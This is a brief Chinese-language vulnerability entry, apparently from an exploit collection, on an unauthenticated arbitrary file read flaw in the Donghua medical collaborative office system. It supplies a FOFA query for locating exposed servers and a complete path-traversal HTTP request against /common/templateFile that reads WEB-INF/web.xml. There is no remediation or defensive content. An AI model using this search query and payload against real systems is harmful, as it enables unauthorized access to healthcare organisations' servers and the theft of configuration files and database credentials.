# 东华医疗协同办公系统templateFile存在任意文件下载漏洞

东华医疗协同办公系统 templateFile 存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。

## fofa

```yaml
body="东华医疗协同办公系统"
```

## poc

```java
GET /common/templateFile?template_name=../../WEB-INF/web.xml HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408162053596.png)